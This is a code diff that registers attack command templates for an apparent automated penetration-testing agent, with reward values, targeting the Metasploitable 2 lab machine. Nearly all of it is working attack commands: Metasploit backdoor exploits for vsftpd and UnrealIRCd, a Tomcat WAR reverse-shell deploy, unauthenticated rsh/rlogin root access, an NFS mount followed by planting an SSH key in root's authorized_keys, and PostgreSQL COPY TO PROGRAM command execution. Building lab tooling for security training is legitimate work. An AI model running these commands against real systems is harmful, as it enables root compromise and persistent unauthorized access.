@@ -2077,6 +2077,289 @@ register(CommandTemplate(
 
 
 # =============================================================================
+# METASPLOITABLE 2 — SPECIFIC ATTACK COMMANDS
+# =============================================================================
+
+# --- MS2 Targeted Port Scans ---
+register(CommandTemplate(
+    name="nmap_port_21",
+    template="nmap -sV -p 21 {target}",
+    description="Scan FTP port for vsftpd version detection on MS2.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["vsftpd", "21/tcp", "open"],
+    typical_reward=3.0,
+    tags={"recon", "ftp", "ms2"},
+    why="Detects vsftpd 2.3.4 which has a known backdoor",
+    when="Initial reconnaissance of FTP service",
+))
+
+register(CommandTemplate(
+    name="nmap_port_6667",
+    template="nmap -sV -p 6667 {target}",
+    description="Scan IRC port for UnrealIRCd on MS2.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["UnrealIRCd", "6667/tcp", "open", "irc"],
+    typical_reward=3.0,
+    tags={"recon", "irc", "ms2"},
+    why="Detects UnrealIRCd 3.2.8.1 which has a known backdoor",
+    when="Initial reconnaissance of IRC service",
+))
+
+register(CommandTemplate(
+    name="nmap_port_1524",
+    template="nmap -sV -p 1524 {target}",
+    description="Scan for ingreslock backdoor shell on port 1524.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["1524/tcp", "open", "bindshell", "ingreslock"],
+    typical_reward=3.0,
+    tags={"recon", "backdoor", "ms2"},
+    why="Port 1524 is an open backdoor shell on MS2 — instant root",
+    when="Scanning for low-hanging fruit backdoors",
+))
+
+register(CommandTemplate(
+    name="nmap_port_8180",
+    template="nmap -sV -p 8180 {target}",
+    description="Scan for Apache Tomcat on port 8180.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["8180/tcp", "open", "Tomcat", "http"],
+    typical_reward=3.0,
+    tags={"recon", "web", "ms2"},
+    why="Detects Tomcat with default credentials on MS2",
+    when="Scanning for web application servers",
+))
+
+register(CommandTemplate(
+    name="nmap_port_5432",
+    template="nmap -sV -p 5432 {target}",
+    description="Scan for PostgreSQL on port 5432.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["5432/tcp", "open", "PostgreSQL", "postgresql"],
+    typical_reward=3.0,
+    tags={"recon", "db", "ms2"},
+    why="Detects PostgreSQL with default postgres:postgres creds on MS2",
+    when="Scanning for database services",
+))
+
+register(CommandTemplate(
+    name="nmap_rservices",
+    template="nmap -sV -p 512,513,514 {target}",
+    description="Scan for r-services (rexec, rlogin, rsh) on ports 512-514.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["512/tcp", "513/tcp", "514/tcp", "open", "exec", "login", "shell"],
+    typical_reward=3.0,
+    tags={"recon", "rservices", "ms2"},
+    why="R-services on MS2 allow unauthenticated remote access as root",
+    when="Scanning for legacy services with no authentication",
+))
+
+# --- MS2 Exploitation Commands ---
+register(CommandTemplate(
+    name="vsftpd_exploit",
+    template="msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; exploit'",
+    description="Exploit vsftpd 2.3.4 backdoor for root shell.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["shell session", "uid=0", "root", "Backdoor"],
+    typical_reward=50.0,
+    tags={"exploit", "ftp", "backdoor", "ms2"},
+    why="vsftpd 2.3.4 has a backdoor triggered by :) in USER field — gives root",
+    when="vsftpd 2.3.4 detected on port 21",
+))
+
+register(CommandTemplate(
+    name="unrealircd_exploit",
+    template="msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {target}; exploit'",
+    description="Exploit UnrealIRCd 3.2.8.1 backdoor for root shell.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["shell session", "uid=0", "root", "Backdoor"],
+    typical_reward=50.0,
+    tags={"exploit", "irc", "backdoor", "ms2"},
+    why="UnrealIRCd 3.2.8.1 has a backdoor that gives root shell",
+    when="UnrealIRCd detected on port 6667",
+))
+
+register(CommandTemplate(
+    name="telnet_1524",
+    template="telnet {target} 1524",
+    description="Connect to ingreslock backdoor on port 1524 for instant root.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["root", "uid=0", "Connected"],
+    typical_reward=60.0,
+    tags={"exploit", "backdoor", "instant", "ms2"},
+    why="Port 1524 is a pre-existing backdoor on MS2 — instant root shell",
+    when="Port 1524 found open during recon",
+))
+
+register(CommandTemplate(
+    name="root_shell_confirm",
+    template="id",
+    description="Confirm root access by checking uid.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["uid=0", "root"],
+    typical_reward=10.0,
+    tags={"post-exploit", "verification"},
+    why="Confirms root access after successful exploitation",
+    when="After obtaining a shell via any exploit",
+))
+
+register(CommandTemplate(
+    name="rsh_root",
+    template="rsh -l root {target} id",
+    description="Use rsh for unauthenticated root command execution.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["uid=0", "root"],
+    typical_reward=40.0,
+    tags={"exploit", "rservices", "ms2"},
+    why="R-services on MS2 have no authentication — direct root access",
+    when="Port 514 (rsh) found open",
+))
+
+register(CommandTemplate(
+    name="rlogin_root",
+    template="rlogin -l root {target}",
+    description="Use rlogin for unauthenticated root login.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["root@", "uid=0", "Last login"],
+    typical_reward=20.0,
+    tags={"exploit", "rservices", "ms2"},
+    why="R-login on MS2 allows root login without password",
+    when="Port 513 (rlogin) found open",
+))
+
+# --- MS2 NFS + Persistence ---
+register(CommandTemplate(
+    name="rpcinfo_check",
+    template="rpcinfo -p {target}",
+    description="Check RPC services to find NFS and mountd.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["nfs", "mountd", "portmapper", "2049"],
+    typical_reward=5.0,
+    tags={"recon", "nfs", "rpc", "ms2"},
+    why="Discovers NFS service availability for mounting remote filesystems",
+    when="Looking for NFS shares on target",
+))
+
+register(CommandTemplate(
+    name="showmount_enum",
+    template="showmount -e {target}",
+    description="Show exported NFS shares.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["Export list", "/"],
+    typical_reward=10.0,
+    tags={"enum", "nfs", "ms2"},
+    why="NFS on MS2 exports / (root) to everyone — can mount full filesystem",
+    when="NFS (port 2049) detected during recon",
+))
+
+register(CommandTemplate(
+    name="nfs_mount",
+    template="mount -t nfs {target}:/ /tmp/nfs_mount",
+    description="Mount NFS root share to access target filesystem.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["mounted", "mount"],
+    typical_reward=25.0,
+    tags={"exploit", "nfs", "ms2"},
+    why="Mounts the entire target filesystem for reading/writing",
+    when="NFS export of / found via showmount",
+))
+
+register(CommandTemplate(
+    name="ssh_key_plant",
+    template="cp /root/.ssh/id_rsa.pub /tmp/nfs_mount/root/.ssh/authorized_keys",
+    description="Plant SSH public key via NFS for persistent root access.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["success", "copied"],
+    typical_reward=30.0,
+    tags={"privesc", "persistence", "nfs", "ms2"},
+    why="Plants SSH key via NFS mount for persistent passwordless root access",
+    when="NFS root share mounted successfully",
+))
+
+# --- MS2 Tomcat Manager ---
+register(CommandTemplate(
+    name="tomcat_cred_test",
+    template="curl -s http://{target}:8180/manager/html --user tomcat:tomcat",
+    description="Test default Tomcat credentials on port 8180.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["Tomcat", "Manager", "200", "Deploy"],
+    typical_reward=15.0,
+    tags={"enum", "web", "creds", "ms2"},
+    why="Tomcat on MS2 has default tomcat:tomcat credentials on /manager",
+    when="Tomcat detected on port 8180",
+))
+
+register(CommandTemplate(
+    name="war_deploy",
+    template="msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS {target}; set RPORT 8180; set HttpUsername tomcat; set HttpPassword tomcat; exploit'",
+    description="Deploy WAR reverse shell via Tomcat manager.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["shell session", "Meterpreter", "uid="],
+    typical_reward=35.0,
+    tags={"exploit", "web", "ms2"},
+    why="Deploys malicious WAR file via Tomcat manager for shell access",
+    when="Tomcat manager accessible with default creds",
+))
+
+# --- MS2 PostgreSQL RCE ---
+register(CommandTemplate(
+    name="psql_default_creds",
+    template="psql -h {target} -U postgres -c '\\l'",
+    description="Connect to PostgreSQL with default postgres:postgres creds.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["List of databases", "template", "postgres"],
+    typical_reward=15.0,
+    tags={"enum", "db", "creds", "ms2"},
+    why="PostgreSQL on MS2 has default postgres:postgres credentials",
+    when="PostgreSQL detected on port 5432",
+))
+
+register(CommandTemplate(
+    name="psql_rce",
+    template="psql -h {target} -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id'\"",
+    description="Execute OS commands via PostgreSQL COPY ... TO PROGRAM.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["uid=", "root", "postgres"],
+    typical_reward=35.0,
+    tags={"exploit", "db", "rce", "ms2"},
+    why="PostgreSQL COPY TO PROGRAM allows arbitrary OS command execution",
+    when="PostgreSQL access confirmed with default creds",
+))
+
+
+# =============================================================================
 # HELPER FUNCTIONS
 # =============================================================================
 
